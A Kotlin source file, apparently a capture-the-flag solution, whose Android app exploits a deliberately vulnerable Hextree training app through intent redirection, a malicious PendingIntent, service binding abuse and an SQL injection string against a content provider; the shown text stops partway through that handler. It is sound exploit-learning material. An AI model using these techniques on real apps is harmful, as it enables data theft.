package io.ks.intentatk

import android.app.Activity
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.ServiceConnection
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.os.RemoteException
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.net.toUri
import io.hextree.attacksurface.services.IFlag28Interface
import io.hextree.attacksurface.services.IFlag29Interface
import io.ks.intentatk.ui.theme.IntentAtkTheme


class HextreeActivity : ComponentActivity() {

    private val receiver = RecvIntent18()
    private val receiver2 = RecvIntent20()
    private val receiver3 = RecvIntent21()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            IntentAtkTheme {
                Scaffold( modifier = Modifier.fillMaxSize() ) { innerPadding ->
                    Greeting(
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }

        registerReceiver(receiver, IntentFilter("io.hextree.broadcast.FREE_FLAG"),RECEIVER_EXPORTED)
        registerReceiver(receiver2, IntentFilter("io.hextree.broadcast.GET_FLAG"),RECEIVER_EXPORTED)
        registerReceiver(receiver3, IntentFilter("io.hextree.broadcast.GIVE_FLAG"),RECEIVER_EXPORTED)

    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
        unregisterReceiver(receiver2)
        unregisterReceiver(receiver3)
    }



}

enum class Action {
    CaptureImage,
    Intent1,
    Intent2,
    Intent3,
    Intent4,
    Intent5,
    Intent6,
    Intent7,
    Intent8,
    Intent9,
    Intent10,
    Intent11,
    Intent12,
    Intent16,
    Intent17,
    Intent19,
    Intent22,
    Intent23,
    Intent24,
    Intent25,
    Intent26,
    Intent27,
    Intent28,
    Intent29,
    Intent13,
    Intent30,
    Intent31,
    Intent32,
    Intent33,
    Intent34,
    Intent35,
    Intent36,
    Intent37,
    Intent38,
    Intent39,
    Intent40,
    Intent41
}

@Composable
fun HandleIntentCam(onImageCaptured: (Bitmap) -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result : ActivityResult ->
        if (result.resultCode == Activity.RESULT_OK) {
            val data = result.data

            val bitmap: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                //this only works on API level 33 and above
                data?.getParcelableExtra("data", Bitmap::class.java)
            } else {
                @Suppress("DEPRECATION")
                data?.getParcelableExtra("data") as? Bitmap
            }

            if (bitmap != null) {
                onImageCaptured(bitmap)
                Utils.showDialog(context, result.data)
                Log.d("IntentDump", "test: ${result.data}")
            } else {
                Log.d("IntentDump", "Bitmap is null or not returned")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }
    }

    // Trigger the camera intent only when explicitly launched
    LaunchedEffect(Unit) {
        val intent = Intent().apply{
            action = "android.media.action.IMAGE_CAPTURE"
        }
        startForResult.launch(intent)
    }
}

@Composable
fun HandleIntent1(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag1Activity"
        )
    }
    context.startActivity(intent)
    onIntentHandled()
}

@Composable
fun HandleIntent2(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    // Create and launch the intent
    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag2Activity"
            )
            action = "io.hextree.action.GIVE_FLAG"
        }
        startForResult.launch(intent)
    }
}

@Composable
fun HandleIntent3(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    // Create and launch the intent
    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag3Activity"
            )
            action = "io.hextree.action.GIVE_FLAG"
            data = "https://app.hextree.io/map/android".toUri()
        }
        startForResult.launch(intent)
    }
}

@Composable
fun HandleIntent4(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "INIT_ACTION"
        }
        startForResult.launch(intent)
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "GET_FLAG_ACTION"
        }
        startForResult.launch(intent)
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "BUILD_ACTION"
        }
        startForResult.launch(intent)
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "PREPARE_ACTION"
        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent5(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    LaunchedEffect(Unit) {
        val intent1 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("reason","back")
        }
        val intent2 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("return",42)
            putExtra("nextIntent",intent1)
        }
        val intent3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("android.intent.extra.INTENT",intent2)
        }

        startForResult.launch(intent3)
    }

}

@Composable
fun HandleIntent6(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    LaunchedEffect(Unit) {
        val intent1 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag6Activity"
            )
            putExtra("reason","next")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        val intent2 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("return",42)
            putExtra("nextIntent",intent1)
        }
        val intent3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("android.intent.extra.INTENT",intent2)
        }

        startForResult.launch(intent3)
    }

}

@Composable
fun HandleIntent7(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Log.d("IntentDump", "Received result ${result}")
        Utils.showDialog(context, result.data)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                // Use the dumpIntent method from Utils to log the intent details
                val intentDetails = Utils.dumpIntent(context, intent)
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }


        // Call the callback after handling the intent
        onIntentHandled()

    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag7Activity"
            )
            action = "OPEN"
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        startForResult.launch(intent)
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag7Activity"
            )
            action = "REOPEN"
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        startForResult.launch(intent)
    }
}

@Composable
fun HandleIntent8(onIntentHandled: () -> Unit) {
    //change the activity from MainAcitivty to HextreeActivity to fulfill the requirement
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        Utils.showDialog(context, result.data)
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag8Activity"
            )
        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent9(onIntentHandled: () -> Unit) {
    //change the activity from MainAcitivty to HextreeActivity to fulfill the requirement
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag9Activity"
            )
        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent10(onIntentHandled: () -> Unit) {
    //this is just button to trigger the activity that cant export
    // solution = the RecvIntent10to12.kt and the Android manifest activity
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent1 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag10Activity"
            )
            putExtra("reason","next")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        val intent2 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("return",42)
            putExtra("nextIntent",intent1)
        }
        val intent3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("android.intent.extra.INTENT",intent2)
        }

        startForResult.launch(intent3)
    }

}

@Composable
fun HandleIntent11(onIntentHandled: () -> Unit) {
    //this is just button to trigger the activity that cant export
    // solution = the RecvIntent.kt and the Android manifest activity
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent1 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag11Activity"
            )
            putExtra("reason","next")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        val intent2 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("return",42)
            putExtra("nextIntent",intent1)
        }
        val intent3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("android.intent.extra.INTENT",intent2)
        }

        startForResult.launch(intent3)
    }

}

@Composable
fun HandleIntent12(onIntentHandled: () -> Unit) {
    //this is just button to trigger the activity that cant export
    // solution = the RecvIntent.kt and the Android manifest activity
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag12Activity"
            )
            putExtra("LOGIN", true)
        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent13(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag13Activity"
            )
            putExtra("com.android.browser.application_id", "1")
            data = Uri.parse("hex://flag?action=give-me")
            addCategory(Intent.CATEGORY_BROWSABLE)
            action = Intent.ACTION_VIEW

        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent16(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver")
        putExtra("flag", "give-flag-16")
    }
    context.sendBroadcast(intent)

    onIntentHandled()
}

@Composable
fun HandleIntent17(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver")
        putExtra("flag", "give-flag-17")
    }
    context.sendOrderedBroadcast(intent,null)

    onIntentHandled()
}

@Composable
fun HandleIntent19(onIntentHandled: () -> Unit){
    Log.i("test", "clicked")
    val context = LocalContext.current
    val bundle = Bundle().apply{
        putInt("appWidgetMaxHeight", 1094795585)
        putInt("appWidgetMinHeight",322376503)
    }
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget")
        action = "android.appwidget.action.fake.APPWIDGET_UPDATE"
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_RECEIVER_FOREGROUND)
        putExtra("appWidgetOptions", bundle)
    }
    context.sendBroadcast(intent,null)

    onIntentHandled()
}

@Composable
fun HandleIntent22(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        Log.d("IntentDump", result.toString())
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        // Craft the malicious PendingIntent
        val maliciousIntent = Intent()
        val maliciousPendingIntent = PendingIntent.getBroadcast(
            context,
            0,
            maliciousIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag22Activity"
            )
            putExtra("PENDING", maliciousPendingIntent)
        }
        startForResult.launch(intent)
    }

}

@Composable
fun HandleIntent23(onIntentHandled: () -> Unit) {
    val context = LocalContext.current
    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        // Handle result if needed
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data
            if (intent != null) {
                Log.d("IntentDump", intentDetails)

                // Alternatively, show a dialog with the intent details
                Utils.showDialog(context, intent)
            } else {
                Log.d("IntentDump", "Received intent is null")
            }
        } else {
            Log.d("IntentDump", "Result code is not OK")
        }

        // Call the callback after handling the intent
        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent1 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag23Activity"
            )
            putExtra("reason","next")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        val intent2 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("return",42)
            putExtra("nextIntent",intent1)
        }
        val intent3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            putExtra("android.intent.extra.INTENT",intent2)
        }

        startForResult.launch(intent3)
    }

}

@Composable
fun HandleIntent24(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service")
        action = "io.hextree.services.START_FLAG24_SERVICE"
    }
    context.startService(intent)

    onIntentHandled()
}

@Composable
fun HandleIntent25(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service")
        action = "io.hextree.services.UNLOCK1"
    }
    val intent2 = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service")
        action = "io.hextree.services.UNLOCK2"
    }
    val intent3 = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service")
        action = "io.hextree.services.UNLOCK3"
    }
    context.startForegroundService(intent)
    context.startForegroundService(intent2)
    context.startForegroundService(intent3)

    onIntentHandled()
}

@Composable
fun HandleIntent26(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service")
    }

    val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder?) {
            val serviceMessenger = Messenger(service)
            val msg = Message.obtain(null, 42)
            try{
                serviceMessenger.send(msg)
            } catch (e: RemoteException){
                throw RuntimeException(e)
            }
        }

        override fun onServiceDisconnected(name: ComponentName) {

        }
    }


    context.bindService(intent,serviceConnection, Context.BIND_AUTO_CREATE)

    onIntentHandled()
}

@Composable
fun HandleIntent27(onIntentHandled: () -> Unit) {
    var serviceMessenger: Messenger? = null
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service")
    }

    // Client Messenger to handle responses from the service
    val clientMessenger = Messenger(object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            when (msg.what) {
                1 -> { // Echo Response
                    val response = msg.data.getString("reply")
                    Log.i("Message", "Received Echo Response: $response")
                }
                2 -> { // Received Password
                    val receivedPassword = msg.data.getString("password")
                    Log.i("Message", "Received Password: $receivedPassword")

                    // Send a follow-up message with what = 3 to request the flag
                    val flagRequest = Message.obtain(null, 3).apply {
                        data = Bundle().apply {
                            putString("password", receivedPassword)
                        }
                        replyTo = Messenger(object : Handler(Looper.getMainLooper()) {
                            override fun handleMessage(msg: Message) {
                                when (msg.what) {
                                    3 -> { // Final Response from Service
                                        val response = msg.data.getString("reply")
                                        Log.i("Message", "Received Flag Response: $response")
                                    }
                                    else -> {
                                        Log.w("Message", "Unexpected message type: ${msg.what}")
                                    }
                                }
                            }
                        })
                    }

                    try {
                        serviceMessenger?.send(flagRequest)
                    } catch (e: RemoteException) {
                        Log.e("Message", "Error sending flag request", e)
                    }
                }
                else -> {
                    val response = msg.data.getString("reply")
                    Log.i("Message", "Received Response: $response")
                }
            }
        }
    })

    // Service Connection to manage service binding
    val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder?) {
            serviceMessenger = Messenger(service)

            // Send initial message with what = 1 (Echo)
            val echoMessage = Message.obtain(null, 1).apply {
                replyTo = clientMessenger
                data = Bundle().apply {
                    putString("echo", "give flag")
                }
            }

            // Send message with what = 2 (Request Password)
            val passwordRequest = Message.obtain(null, 2).apply {
                replyTo = clientMessenger
                obj = Bundle().apply{
                }
            }

            try {
                serviceMessenger?.send(echoMessage)
                serviceMessenger?.send(passwordRequest)
                Log.i("Message", "Sent echo message and Password Request")
            } catch (e: RemoteException) {
                Log.e("Message", "Sent echo message and Password Request", e)
            }
        }

        override fun onServiceDisconnected(name: ComponentName) {
            serviceMessenger = null
            Log.w("ServiceConnection", "Service disconnected")
        }
    }

    // Bind to the service
    context.bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)

    onIntentHandled()
}

@Composable
fun HandleIntent28(onIntentHandled: () -> Unit){
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service")
    }

    val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder?) {
            val RemoteService = IFlag28Interface.Stub.asInterface(service)
            try{
                RemoteService.openFlag()
            } catch (e: RemoteException){
                throw RuntimeException(e)
            }
        }

        override fun onServiceDisconnected(name: ComponentName) {

        }
    }


    context.bindService(intent,serviceConnection, Context.BIND_AUTO_CREATE)

    onIntentHandled()
}

@Composable
fun HandleIntent29(onIntentHandled: () -> Unit) {
    var serviceMessenger: IFlag29Interface?
    val context = LocalContext.current
    val intent = Intent().apply {
        setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service")
    }

    val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder?) {
            serviceMessenger = IFlag29Interface.Stub.asInterface(service)

            try {
                val response = serviceMessenger?.init()
                Log.i("Message", "Received Response: $response")
                serviceMessenger?.authenticate(response)
                serviceMessenger?.success()
            } catch (e: RemoteException) {
                Log.e("Message", "Sent echo message and Password Request", e)
            }
        }

        override fun onServiceDisconnected(name: ComponentName) {
            serviceMessenger = null
            Log.w("ServiceConnection", "Service disconnected")
        }
    }

    // Bind to the service
    context.bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)

    onIntentHandled()
}

@Composable
fun HandleIntent30(onIntentHandled: () -> Unit) {

    val context = LocalContext.current
    val contentUri = Uri.parse("content://io.hextree.flag30/success")
    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
        if (cursor.moveToFirst()) {
            val sb = StringBuilder()
            do {
                for (i in 0 until cursor.columnCount) {
                    if (i > 0) sb.append(", ")
                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                }
                sb.append("\n")
            } while (cursor.moveToNext())
            Log.i("yeet",sb.toString())
        }
    }
    onIntentHandled()
}

@Composable
fun HandleIntent31(onIntentHandled: () -> Unit) {

    val context = LocalContext.current
    val contentUri = Uri.parse("content://io.hextree.flag31/flag/31")
    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
        if (cursor.moveToFirst()) {
            val sb = StringBuilder()
            do {
                for (i in 0 until cursor.columnCount) {
                    if (i > 0) sb.append(", ")
                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                }
                sb.append("\n")
            } while (cursor.moveToNext())
            Log.i("yeet",sb.toString())
        }
    }
    onIntentHandled()
}

@Composable
fun HandleIntent32(onIntentHandled: () -> Unit) {

    val context = LocalContext.current
    val contentUri = Uri.parse("content://io.hextree.flag32/flags")
    val sqlquery = "1=1) UNION SELECT * from Flag WHERE visible=0 UNION SELECT *, null from Note --"
    context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
        if (cursor.moveToFirst()) {
            val sb = StringBuilder()
            do {
